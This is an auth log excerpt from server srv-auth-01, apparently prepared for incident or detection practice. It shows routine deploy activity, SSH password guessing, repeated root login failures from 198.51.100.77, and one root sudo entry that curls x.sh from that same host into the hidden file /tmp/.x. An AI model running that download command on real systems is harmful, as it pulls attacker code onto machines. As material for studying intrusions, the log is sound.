+2026-11-05 01:04:05 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:06 srv-auth-01 sshd[8136]: Failed password for invalid user oracle from 203.0.113.84 port 57908 ssh2
+2026-11-05 01:04:07 srv-auth-01 sshd[2419]: Accepted publickey for deploy from 10.0.4.227 port 44771 ssh2
+2026-11-05 01:04:08 srv-auth-01 sshd[8613]: Accepted publickey for deploy from 10.0.9.158 port 51895 ssh2
+2026-11-05 01:04:09 srv-auth-01 sshd[6511]: Failed password for invalid user admin from 203.0.113.128 port 57884 ssh2
+2026-11-05 01:04:10 srv-auth-01 systemd[1]: Started Session 196 of user deploy.
+2026-11-05 01:04:11 srv-auth-01 sshd[4475]: Failed password for invalid user oracle from 203.0.113.206 port 38465 ssh2
+2026-11-05 01:04:12 srv-auth-01 systemd[1]: Started Session 296 of user deploy.
+2026-11-05 01:04:13 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:14 srv-auth-01 systemd[1]: Started Session 579 of user deploy.
+2026-11-05 01:04:15 srv-auth-01 CRON[9464]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:16 srv-auth-01 sshd[2402]: Accepted publickey for deploy from 10.0.3.186 port 43317 ssh2
+2026-11-05 01:04:17 srv-auth-01 sshd[4937]: Failed password for invalid user pi from 203.0.113.167 port 53325 ssh2
+2026-11-05 01:04:18 srv-auth-01 sshd[8342]: Failed password for invalid user admin from 203.0.113.25 port 39641 ssh2
+2026-11-05 01:04:19 srv-auth-01 sshd[7625]: Accepted publickey for deploy from 10.0.3.80 port 51756 ssh2
+2026-11-05 01:04:20 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:21 srv-auth-01 sshd[9698]: Failed password for invalid user oracle from 203.0.113.110 port 54442 ssh2
+2026-11-05 01:04:22 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:23 srv-auth-01 systemd[1]: Started Session 729 of user deploy.
+2026-11-05 01:04:24 srv-auth-01 sshd[5438]: Failed password for invalid user oracle from 203.0.113.66 port 37554 ssh2
+2026-11-05 01:04:25 srv-auth-01 CRON[4155]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:26 srv-auth-01 systemd[1]: Started Session 132 of user deploy.
+2026-11-05 01:04:27 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:28 srv-auth-01 sshd[4138]: Accepted publickey for deploy from 10.0.3.191 port 45866 ssh2
+2026-11-05 01:04:29 srv-auth-01 systemd[1]: Started Session 751 of user deploy.
+2026-11-05 01:04:30 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:31 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:32 srv-auth-01 CRON[4180]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:33 srv-auth-01 systemd[1]: Started Session 242 of user deploy.
+2026-11-05 01:04:34 srv-auth-01 systemd[1]: Started Session 193 of user deploy.
+2026-11-05 01:04:35 srv-auth-01 systemd[1]: Started Session 24 of user deploy.
+2026-11-05 01:04:36 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:37 srv-auth-01 systemd[1]: Started Session 56 of user deploy.
+2026-11-05 01:04:38 srv-auth-01 CRON[5786]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:39 srv-auth-01 sshd[9042]: Accepted publickey for deploy from 10.0.1.225 port 30401 ssh2
+2026-11-05 01:04:40 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:41 srv-auth-01 sshd[8843]: Failed password for invalid user pi from 203.0.113.89 port 36041 ssh2
+2026-11-05 01:04:42 srv-auth-01 CRON[5136]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:43 srv-auth-01 sshd[2869]: Failed password for invalid user admin from 203.0.113.104 port 46113 ssh2
+2026-11-05 01:04:44 srv-auth-01 CRON[1878]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:45 srv-auth-01 sshd[3444]: Accepted publickey for deploy from 10.0.9.244 port 39956 ssh2
+2026-11-05 01:04:46 srv-auth-01 CRON[5066]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:47 srv-auth-01 CRON[7818]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:48 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:49 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:50 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:51 srv-auth-01 sshd[8253]: Failed password for invalid user oracle from 203.0.113.222 port 49284 ssh2
+2026-11-05 01:04:52 srv-auth-01 sshd[6003]: Failed password for invalid user admin from 203.0.113.158 port 54251 ssh2
+2026-11-05 01:04:53 srv-auth-01 CRON[4404]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:04:54 srv-auth-01 sshd[5335]: Accepted publickey for deploy from 10.0.1.42 port 37859 ssh2
+2026-11-05 01:04:55 srv-auth-01 sshd[2229]: Accepted publickey for deploy from 10.0.2.2 port 43386 ssh2
+2026-11-05 01:04:56 srv-auth-01 sshd[8699]: Failed password for invalid user oracle from 203.0.113.10 port 37585 ssh2
+2026-11-05 01:04:57 srv-auth-01 systemd[1]: Started Session 733 of user deploy.
+2026-11-05 01:04:58 srv-auth-01 systemd[1]: Started Session 729 of user deploy.
+2026-11-05 01:04:59 srv-auth-01 sshd[2166]: Failed password for invalid user test from 203.0.113.238 port 38668 ssh2
+2026-11-05 01:05:00 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:01 srv-auth-01 sshd[7965]: Accepted publickey for deploy from 10.0.1.141 port 37366 ssh2
+2026-11-05 01:05:02 srv-auth-01 sshd[5352]: Accepted publickey for deploy from 10.0.2.20 port 31954 ssh2
+2026-11-05 01:05:03 srv-auth-01 sshd[6039]: Accepted publickey for deploy from 10.0.9.193 port 57008 ssh2
+2026-11-05 01:05:04 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:05 srv-auth-01 sshd[3037]: Failed password for invalid user pi from 203.0.113.178 port 39964 ssh2
+2026-11-05 01:05:06 srv-auth-01 sshd[5460]: Failed password for invalid user pi from 203.0.113.114 port 32635 ssh2
+2026-11-05 01:05:07 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:08 srv-auth-01 sshd[6280]: Failed password for invalid user oracle from 203.0.113.8 port 32992 ssh2
+2026-11-05 01:05:09 srv-auth-01 sshd[1339]: Accepted publickey for deploy from 10.0.4.149 port 31318 ssh2
+2026-11-05 01:05:10 srv-auth-01 sshd[8708]: Accepted publickey for deploy from 10.0.8.168 port 44490 ssh2
+2026-11-05 01:05:11 srv-auth-01 systemd[1]: Started Session 195 of user deploy.
+2026-11-05 01:05:12 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:13 srv-auth-01 sshd[2494]: Failed password for invalid user pi from 203.0.113.91 port 43380 ssh2
+2026-11-05 01:05:14 srv-auth-01 systemd[1]: Started Session 338 of user deploy.
+2026-11-05 01:05:15 srv-auth-01 CRON[3634]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:16 srv-auth-01 systemd[1]: Started Session 431 of user deploy.
+2026-11-05 01:05:17 srv-auth-01 sshd[5722]: Failed password for invalid user pi from 203.0.113.210 port 54920 ssh2
+2026-11-05 01:05:18 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:19 srv-auth-01 sshd[2442]: Failed password for invalid user oracle from 203.0.113.66 port 40593 ssh2
+2026-11-05 01:05:20 srv-auth-01 CRON[7622]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:21 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:22 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:23 srv-auth-01 sshd[1888]: Failed password for invalid user test from 203.0.113.134 port 41854 ssh2
+2026-11-05 01:05:24 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:25 srv-auth-01 sshd[1845]: Failed password for invalid user test from 203.0.113.70 port 47996 ssh2
+2026-11-05 01:05:26 srv-auth-01 sshd[5719]: Accepted publickey for deploy from 10.0.7.227 port 52880 ssh2
+2026-11-05 01:05:27 srv-auth-01 sshd[2989]: Failed password for invalid user admin from 203.0.113.163 port 49951 ssh2
+2026-11-05 01:05:28 srv-auth-01 sshd[3594]: Accepted publickey for deploy from 10.0.4.143 port 30448 ssh2
+2026-11-05 01:05:29 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:30 srv-auth-01 CRON[4681]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:31 srv-auth-01 CRON[8560]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:32 srv-auth-01 CRON[3522]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:33 srv-auth-01 sshd[5781]: Failed password for invalid user oracle from 203.0.113.108 port 57352 ssh2
+2026-11-05 01:05:34 srv-auth-01 sshd[8736]: Failed password for invalid user test from 203.0.113.118 port 48063 ssh2
+2026-11-05 01:05:35 srv-auth-01 sshd[7284]: Accepted publickey for deploy from 10.0.3.237 port 49640 ssh2
+2026-11-05 01:05:36 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:37 srv-auth-01 sshd[2143]: Accepted publickey for deploy from 10.0.4.199 port 55886 ssh2
+2026-11-05 01:05:38 srv-auth-01 sshd[6568]: Failed password for invalid user oracle from 203.0.113.212 port 30084 ssh2
+2026-11-05 01:05:39 srv-auth-01 systemd[1]: Started Session 753 of user deploy.
+2026-11-05 01:05:40 srv-auth-01 systemd[1]: Started Session 867 of user deploy.
+2026-11-05 01:05:41 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:42 srv-auth-01 sshd[3434]: Failed password for invalid user pi from 203.0.113.139 port 45870 ssh2
+2026-11-05 01:05:43 srv-auth-01 systemd[1]: Started Session 350 of user deploy.
+2026-11-05 01:05:44 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:45 srv-auth-01 sshd[8460]: Failed password for invalid user oracle from 203.0.113.224 port 36181 ssh2
+2026-11-05 01:05:46 srv-auth-01 sshd[7274]: Accepted publickey for deploy from 10.0.3.221 port 55413 ssh2
+2026-11-05 01:05:47 srv-auth-01 sshd[1715]: Failed password for invalid user oracle from 203.0.113.192 port 45498 ssh2
+2026-11-05 01:05:48 srv-auth-01 sshd[7325]: Failed password for invalid user test from 203.0.113.128 port 31213 ssh2
+2026-11-05 01:05:49 srv-auth-01 sshd[9229]: Accepted publickey for deploy from 10.0.9.86 port 58498 ssh2
+2026-11-05 01:05:50 srv-auth-01 CRON[8213]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:51 srv-auth-01 CRON[9617]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:05:52 srv-auth-01 sshd[1251]: Failed password for invalid user test from 203.0.113.106 port 58538 ssh2
+2026-11-05 01:05:53 srv-auth-01 sshd[2225]: Accepted publickey for deploy from 10.0.7.202 port 38684 ssh2
+2026-11-05 01:05:54 srv-auth-01 systemd[1]: Started Session 648 of user deploy.
+2026-11-05 01:05:55 srv-auth-01 sshd[2315]: Failed password for invalid user oracle from 203.0.113.220 port 52097 ssh2
+2026-11-05 01:05:56 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:05:57 srv-auth-01 sshd[7000]: Failed password for root from 198.51.100.77 port 41000 ssh2
+2026-11-05 01:05:58 srv-auth-01 systemd[1]: Started Session 651 of user deploy.
+2026-11-05 01:05:59 srv-auth-01 sshd[9864]: Failed password for invalid user admin from 203.0.113.160 port 32242 ssh2
+2026-11-05 01:06:00 srv-auth-01 sshd[5708]: Accepted publickey for deploy from 10.0.3.193 port 32961 ssh2
+2026-11-05 01:06:01 srv-auth-01 sshd[2612]: Failed password for invalid user admin from 203.0.113.115 port 35451 ssh2
+2026-11-05 01:06:02 srv-auth-01 systemd[1]: Started Session 935 of user deploy.
+2026-11-05 01:06:03 srv-auth-01 CRON[1753]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:04 srv-auth-01 systemd[1]: Started Session 825 of user deploy.
+2026-11-05 01:06:05 srv-auth-01 CRON[5806]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:06 srv-auth-01 systemd[1]: Started Session 393 of user deploy.
+2026-11-05 01:06:07 srv-auth-01 sshd[7001]: Failed password for root from 198.51.100.77 port 41001 ssh2
+2026-11-05 01:06:08 srv-auth-01 sshd[3385]: Failed password for invalid user test from 203.0.113.137 port 43502 ssh2
+2026-11-05 01:06:09 srv-auth-01 sshd[7003]: Failed password for root from 198.51.100.77 port 41003 ssh2
+2026-11-05 01:06:10 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:11 srv-auth-01 sshd[3785]: Accepted publickey for deploy from 10.0.2.22 port 49971 ssh2
+2026-11-05 01:06:12 srv-auth-01 sshd[7005]: Failed password for root from 198.51.100.77 port 41005 ssh2
+2026-11-05 01:06:13 srv-auth-01 sshd[4945]: Failed password for invalid user pi from 203.0.113.235 port 49108 ssh2
+2026-11-05 01:06:14 srv-auth-01 sshd[4804]: Accepted publickey for deploy from 10.0.7.165 port 38322 ssh2
+2026-11-05 01:06:15 srv-auth-01 sshd[7002]: Failed password for root from 198.51.100.77 port 41002 ssh2
+2026-11-05 01:06:16 srv-auth-01 sshd[5183]: Failed password for invalid user admin from 203.0.113.232 port 56366 ssh2
+2026-11-05 01:06:17 srv-auth-01 sshd[5712]: Failed password for invalid user test from 203.0.113.20 port 44474 ssh2
+2026-11-05 01:06:18 srv-auth-01 sshd[7007]: Failed password for root from 198.51.100.77 port 41007 ssh2
+2026-11-05 01:06:19 srv-auth-01 systemd[1]: Started Session 611 of user deploy.
+2026-11-05 01:06:20 srv-auth-01 systemd[1]: Started Session 664 of user deploy.
+2026-11-05 01:06:21 srv-auth-01 sshd[5097]: Failed password for invalid user pi from 203.0.113.218 port 39899 ssh2
+2026-11-05 01:06:22 srv-auth-01 sshd[7006]: Failed password for root from 198.51.100.77 port 41006 ssh2
+2026-11-05 01:06:23 srv-auth-01 sshd[7302]: Accepted publickey for deploy from 10.0.7.29 port 37772 ssh2
+2026-11-05 01:06:24 srv-auth-01 sshd[6881]: Failed password for invalid user oracle from 203.0.113.181 port 39674 ssh2
+2026-11-05 01:06:25 srv-auth-01 CRON[7484]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:26 srv-auth-01 systemd[1]: Started Session 18 of user deploy.
+2026-11-05 01:06:27 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:28 srv-auth-01 sshd[7004]: Failed password for root from 198.51.100.77 port 41004 ssh2
+2026-11-05 01:06:29 srv-auth-01 CRON[9138]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:30 srv-auth-01 systemd[1]: Started Session 804 of user deploy.
+2026-11-05 01:06:31 srv-auth-01 sshd[6772]: Accepted publickey for deploy from 10.0.3.164 port 36230 ssh2
+2026-11-05 01:06:32 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:33 srv-auth-01 sshd[7009]: Failed password for root from 198.51.100.77 port 41009 ssh2
+2026-11-05 01:06:34 srv-auth-01 sshd[2591]: Accepted publickey for deploy from 10.0.0.81 port 55841 ssh2
+2026-11-05 01:06:35 srv-auth-01 sshd[1546]: Failed password for invalid user oracle from 203.0.113.189 port 34306 ssh2
+2026-11-05 01:06:36 srv-auth-01 CRON[5835]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:37 srv-auth-01 systemd[1]: Started Session 775 of user deploy.
+2026-11-05 01:06:38 srv-auth-01 sshd[3877]: Failed password for invalid user test from 203.0.113.35 port 55772 ssh2
+2026-11-05 01:06:39 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:40 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:41 srv-auth-01 systemd[1]: Started Session 860 of user deploy.
+2026-11-05 01:06:42 srv-auth-01 sshd[5210]: Accepted publickey for deploy from 10.0.7.249 port 56427 ssh2
+2026-11-05 01:06:43 srv-auth-01 systemd[1]: Started Session 774 of user deploy.
+2026-11-05 01:06:44 srv-auth-01 systemd[1]: Started Session 833 of user deploy.
+2026-11-05 01:06:45 srv-auth-01 CRON[8673]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:46 srv-auth-01 CRON[3306]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:47 srv-auth-01 sshd[7010]: Failed password for root from 198.51.100.77 port 41010 ssh2
+2026-11-05 01:06:48 srv-auth-01 sshd[7511]: Accepted publickey for deploy from 10.0.8.95 port 32959 ssh2
+2026-11-05 01:06:49 srv-auth-01 sshd[1228]: Failed password for invalid user oracle from 203.0.113.139 port 34049 ssh2
+2026-11-05 01:06:50 srv-auth-01 sshd[7038]: Failed password for invalid user oracle from 203.0.113.151 port 42485 ssh2
+2026-11-05 01:06:51 srv-auth-01 systemd[1]: Started Session 120 of user deploy.
+2026-11-05 01:06:52 srv-auth-01 sshd[8724]: Accepted publickey for deploy from 10.0.0.160 port 58974 ssh2
+2026-11-05 01:06:53 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:54 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:06:55 srv-auth-01 CRON[8606]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:06:56 srv-auth-01 systemd[1]: Started Session 674 of user deploy.
+2026-11-05 01:06:57 srv-auth-01 sshd[2911]: Failed password for invalid user test from 203.0.113.13 port 31219 ssh2
+2026-11-05 01:06:58 srv-auth-01 systemd[1]: Started Session 514 of user deploy.
+2026-11-05 01:06:59 srv-auth-01 CRON[2592]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:00 srv-auth-01 sshd[9807]: Accepted publickey for deploy from 10.0.2.101 port 44864 ssh2
+2026-11-05 01:07:01 srv-auth-01 systemd[1]: Started Session 696 of user deploy.
+2026-11-05 01:07:02 srv-auth-01 sshd[7013]: Failed password for root from 198.51.100.77 port 41013 ssh2
+2026-11-05 01:07:03 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:04 srv-auth-01 sshd[7011]: Failed password for root from 198.51.100.77 port 41011 ssh2
+2026-11-05 01:07:05 srv-auth-01 sshd[7008]: Failed password for root from 198.51.100.77 port 41008 ssh2
+2026-11-05 01:07:06 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:07 srv-auth-01 sshd[7797]: Accepted publickey for deploy from 10.0.1.215 port 46034 ssh2
+2026-11-05 01:07:08 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:09 srv-auth-01 systemd[1]: Started Session 43 of user deploy.
+2026-11-05 01:07:10 srv-auth-01 systemd[1]: Started Session 232 of user deploy.
+2026-11-05 01:07:11 srv-auth-01 sshd[8285]: Failed password for invalid user test from 203.0.113.220 port 41884 ssh2
+2026-11-05 01:07:12 srv-auth-01 sshd[7015]: Failed password for root from 198.51.100.77 port 41015 ssh2
+2026-11-05 01:07:13 srv-auth-01 CRON[7018]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:14 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:15 srv-auth-01 sshd[7026]: Failed password for root from 198.51.100.77 port 41026 ssh2
+2026-11-05 01:07:16 srv-auth-01 systemd[1]: Started Session 72 of user deploy.
+2026-11-05 01:07:17 srv-auth-01 sshd[5520]: Failed password for invalid user test from 203.0.113.249 port 34002 ssh2
+2026-11-05 01:07:18 srv-auth-01 sshd[2501]: Failed password for invalid user test from 203.0.113.166 port 50954 ssh2
+2026-11-05 01:07:19 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:20 srv-auth-01 CRON[6464]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:21 srv-auth-01 sshd[3063]: Accepted publickey for deploy from 10.0.9.54 port 32248 ssh2
+2026-11-05 01:07:22 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:23 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:24 srv-auth-01 sshd[6383]: Accepted publickey for deploy from 10.0.2.203 port 59508 ssh2
+2026-11-05 01:07:25 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:26 srv-auth-01 systemd[1]: Started Session 889 of user deploy.
+2026-11-05 01:07:27 srv-auth-01 sshd[3129]: Accepted publickey for deploy from 10.0.8.66 port 56165 ssh2
+2026-11-05 01:07:28 srv-auth-01 sshd[2801]: Accepted publickey for deploy from 10.0.0.35 port 30486 ssh2
+2026-11-05 01:07:29 srv-auth-01 systemd[1]: Started Session 818 of user deploy.
+2026-11-05 01:07:30 srv-auth-01 sshd[6304]: Accepted publickey for deploy from 10.0.0.46 port 38695 ssh2
+2026-11-05 01:07:31 srv-auth-01 CRON[3076]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:32 srv-auth-01 sshd[9619]: Failed password for invalid user admin from 203.0.113.192 port 32082 ssh2
+2026-11-05 01:07:33 srv-auth-01 sshd[8344]: Failed password for invalid user oracle from 203.0.113.133 port 49453 ssh2
+2026-11-05 01:07:34 srv-auth-01 CRON[8405]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:35 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:36 srv-auth-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x
+2026-11-05 01:07:37 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:38 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:39 srv-auth-01 sshd[1510]: Failed password for invalid user admin from 203.0.113.124 port 57764 ssh2
+2026-11-05 01:07:40 srv-auth-01 sshd[7984]: Failed password for invalid user admin from 203.0.113.127 port 53343 ssh2
+2026-11-05 01:07:41 srv-auth-01 sshd[2204]: Failed password for invalid user admin from 203.0.113.84 port 49932 ssh2
+2026-11-05 01:07:42 srv-auth-01 sshd[2076]: Accepted publickey for deploy from 10.0.2.72 port 50457 ssh2
+2026-11-05 01:07:43 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:44 srv-auth-01 systemd[1]: Started Session 400 of user deploy.
+2026-11-05 01:07:45 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:46 srv-auth-01 systemd[1]: Started Session 474 of user deploy.
+2026-11-05 01:07:47 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:48 srv-auth-01 sshd[2624]: Failed password for invalid user admin from 203.0.113.220 port 51453 ssh2
+2026-11-05 01:07:49 srv-auth-01 sshd[7022]: Failed password for root from 198.51.100.77 port 41022 ssh2
+2026-11-05 01:07:50 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:07:51 srv-auth-01 sshd[8046]: Accepted publickey for deploy from 10.0.7.229 port 37487 ssh2
+2026-11-05 01:07:52 srv-auth-01 sshd[6553]: Failed password for invalid user pi from 203.0.113.104 port 43631 ssh2
+2026-11-05 01:07:53 srv-auth-01 CRON[6120]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:54 srv-auth-01 sshd[7023]: Failed password for root from 198.51.100.77 port 41023 ssh2
+2026-11-05 01:07:55 srv-auth-01 sshd[6120]: Failed password for invalid user oracle from 203.0.113.97 port 35001 ssh2
+2026-11-05 01:07:56 srv-auth-01 sshd[2099]: Failed password for invalid user admin from 203.0.113.214 port 32797 ssh2
+2026-11-05 01:07:57 srv-auth-01 CRON[8075]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:58 srv-auth-01 CRON[7105]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:07:59 srv-auth-01 sshd[1982]: Accepted publickey for deploy from 10.0.9.246 port 48402 ssh2
+2026-11-05 01:08:00 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:01 srv-auth-01 sshd[7020]: Failed password for root from 198.51.100.77 port 41020 ssh2
+2026-11-05 01:08:02 srv-auth-01 CRON[7730]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:03 srv-auth-01 systemd[1]: Started Session 904 of user deploy.
+2026-11-05 01:08:04 srv-auth-01 sshd[1842]: Failed password for invalid user oracle from 203.0.113.155 port 40238 ssh2
+2026-11-05 01:08:05 srv-auth-01 systemd[1]: Started Session 116 of user deploy.
+2026-11-05 01:08:06 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:07 srv-auth-01 sshd[3535]: Accepted publickey for deploy from 10.0.7.59 port 57763 ssh2
+2026-11-05 01:08:08 srv-auth-01 CRON[6736]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:08:09 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:08:10 srv-auth-01 sshd[7016]: Failed password for root from 198.51.100.77 port 41016 ssh2
